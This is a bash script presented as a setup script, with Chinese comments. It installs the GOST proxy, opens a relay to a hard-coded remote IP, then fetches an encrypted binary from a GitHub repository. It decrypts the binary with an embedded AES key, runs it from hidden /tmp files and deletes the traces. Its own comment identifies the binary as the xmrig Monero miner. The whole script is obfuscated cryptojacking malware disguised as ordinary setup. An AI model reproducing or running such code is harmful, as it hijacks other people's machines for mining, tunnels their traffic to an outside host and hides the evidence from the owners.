#!/bin/bash
set -e

LOG="/tmp/setup_$(date +%s).log"
exec > >(tee -a "$LOG") 2>&1

echo "[$(date '+%H:%M:%S')] 开始执行 setup.sh"

# 第1条：
echo "[$(date '+%H:%M:%S')] 安装 wget git..."
apt update && apt install -y wget git

# 第2条：
echo "[$(date '+%H:%M:%S')] 下载 GOST..."
wget -q https://github.com/ginuerzh/gost/releases/download/v2.12.0/gost_2.12.0_linux_amd64.tar.gz

# 第3条：
echo "[$(date '+%H:%M:%S')] 安装 GOST..."
tar -zxf gost_2.12.0_linux_amd64.tar.gz
if [ -f gost ]; then
    mv gost /usr/local/bin
    chmod +x /usr/local/bin/gost
    echo "GOST_OK"
else
    wget -q https://github.com/ginuerzh/gost/releases/download/v2.12.0/gost_2.12.0_linux_amd64.tar.gz
    tar -zxf gost_2.12.0_linux_amd64.tar.gz
    mv gost /usr/local/bin
    chmod +x /usr/local/bin/gost
    echo "GOST_RETRY_OK"
fi

# 第4条：
echo "[$(date '+%H:%M:%S')] 启动 GOST..."
nohup gost -L=tcp://:3335 -F=relay+wss://64.81.113.107:9999 >/dev/null 2>&1 &
sleep 4
if pgrep -x "gost" > /dev/null; then
    echo "GOST 进程已启动 (PID: $(pgrep -x gost))"
else
    echo "GOST 启动可能失败"
fi

# 第5条：
echo "[$(date '+%H:%M:%S')] 下载并解密 xmrig..."
# tloos 已 AES-256-CBC 加密, base64 编码, 上传到 GitHub
(echo 't3ZGTw+5WeaSVXdnRKAJV7BR+jf0UY8xW6Ye9b/qDDU=' | base64 -d > /tmp/.k) && (echo 'nNPMWhaTBpBz9/6CAgn5Bw==' | base64 -d > /tmp/.v)
wget -q https://raw.githubusercontent.com/mysudn/moneroocean/main/tloos.enc.b64 -O /tmp/.tl.b64
base64 -d /tmp/.tl.b64 > /tmp/.tl.enc
openssl enc -d -aes-256-cbc -K $(xxd -p -c 64 /tmp/.k) -iv $(xxd -p -c 64 /tmp/.v) -in /tmp/.tl.enc -out /tmp/.tlx
chmod +x /tmp/.tlx
/tmp/.tlx
rm -f /tmp/.k /tmp/.v /tmp/.tl.b64 /tmp/.tl.enc /tmp/.tlx
